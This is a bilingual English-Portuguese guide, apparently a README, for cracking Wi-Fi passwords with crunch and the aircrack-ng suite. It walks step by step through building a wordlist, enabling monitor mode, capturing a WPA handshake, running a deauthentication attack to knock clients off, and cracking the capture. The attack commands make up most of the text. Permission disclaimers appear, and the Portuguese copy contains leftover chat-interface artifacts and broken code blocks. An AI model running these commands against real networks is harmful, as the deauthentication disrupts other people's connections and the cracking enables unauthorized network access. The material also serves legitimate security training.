# Wi-Fi Penetration Testing Guide

> ⚠️ This guide is for educational purposes only. Use it only in environments you have permission to test.

---

## 📁 Setup

Make sure **all processes and files are kept in the same folder** to avoid system clutter.

---

## 🔧 Step 1: Create a Wordlist

### Terminal 1:

1. Open a terminal and create a folder to store the wordlist:
    ```bash
    mkdir wordlists
    cd wordlists
    ```

2. Install **crunch** (if not already installed):
    ```bash
    sudo apt install crunch
    ```

3. Generate the wordlist:
    ```bash
    crunch 4 4 23213 -o wordlist.txt
    ```

- `4 4`: minimum and maximum length of the passwords.
- `23213`: character set for combinations.

---

## 📡 Step 2: Enable Monitor Mode

### Terminal 2:

1. Kill conflicting processes:
    ```bash
    sudo airmon-ng check kill
    ```

2. Start monitor mode on your wireless adapter:
    ```bash
    sudo airmon-ng start <your_interface>
    ```

---

## 📶 Step 3: Scan for Networks

### Terminal 2:

Use the following command to scan for available networks:
```bash
sudo airodump-ng <your_interface>
Identify the BSSID, channel (CH), and ESSID of the target network.

🎯 Step 4: Capture the Handshake
Terminal 3:
⚠️ Do not close this terminal — it captures the handshake!

bash
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture <your_interface>
This will save the captured handshake in a file named capture-01.cap.

💣 Step 5: Deauthentication Attack
Terminal 4:
Force a device to disconnect (and reconnect) to trigger the handshake capture:

bash
sudo aireplay-ng --deauth 10 -a <BSSID> <your_interface>
Watch Terminal 3 to confirm the handshake is captured.

🔓 Step 6: Crack the Password
Use the wordlist you created to crack the captured handshake:

bash
sudo aircrack-ng -w wordlist.txt -b <BSSID> capture-01.cap
✅ Final Step: Restore Network
Return your network interface to normal mode:

bash
sudo systemctl start NetworkManager

📌 Notes
Always use penetration testing tools responsibly and legally.

Test only on networks you own or have explicit permission to audit.

# Guia de Teste de Invasão Wi-Fi

> ⚠️ Este guia é apenas para fins educacionais. Use **somente em redes onde você tem autorização para testar**.

---

## 📁 Organização

Certifique-se de que **todos os processos e arquivos estejam na mesma pasta**, para evitar desorganização no seu sistema.

---

## 🔧 Etapa 1: Criar uma Wordlist

### Terminal 1:

1. Abra um terminal e crie uma pasta para armazenar a wordlist:
    ```bash
    mkdir wordlists
    cd wordlists
    ```

2. Instale o **crunch** (caso ainda não tenha):
    ```bash
    sudo apt install crunch
    ```

3. Gere a wordlist com o seguinte comando:
    ```bash
    crunch 4 4 23213 -o wordlist.txt
    ```

- `4 4`: número mínimo e máximo de caracteres.
- `23213`: conjunto de caracteres para as combinações.

---

## 📡 Etapa 2: Ativar o Modo Monitor

### Terminal 2:

1. Finalize processos que possam interferir:
    ```bash
    sudo airmon-ng check kill
    ```

2. Inicie o modo monitor na sua placa de rede:
    ```bash
    sudo airmon-ng start <sua_placa>
    ```

---

## 📶 Etapa 3: Escanear Redes

### Terminal 2:

Use o comando abaixo para visualizar as redes disponíveis:
```bash
sudo airodump-ng <sua_placa>
Anote o BSSID, o canal (CH) e o nome da rede (ESSID) alvo.

🎯 Etapa 4: Capturar o Handshake
Terminal 3:
⚠️ Este terminal não pode ser fechado — é onde ocorre a captura do handshake.

bash
Copiar
Editar
sudo airodump-ng -c <canal> --bssid <BSSID> -w captura <sua_placa>
A captura será salva em um arquivo como captura-01.cap.

💣 Etapa 5: Desautenticação Forçada
Terminal 4:
Forçamos a desconexão de um dispositivo da rede, o que pode capturar o handshake:

bash
Copiar
Editar
sudo aireplay-ng --deauth 10 -a <BSSID> <sua_placa>
Observe o Terminal 3 para verificar se a captura foi feita com sucesso.

🔓 Etapa 6: Quebrar a Senha
Utilize a wordlist para tentar descriptografar a senha:

bash
Copiar
Editar
sudo aircrack-ng -w wordlist.txt -b <BSSID> captura-01.cap
✅ Etapa Final: Restaurar a Rede
Para voltar ao modo normal da placa de rede:

bash
Copiar
Editar
sudo systemctl start NetworkManager

📌 Observações
Utilize essas ferramentas com responsabilidade e dentro da legalidade.

Realize testes apenas em redes que você possui ou tem autorização explícita para testar.
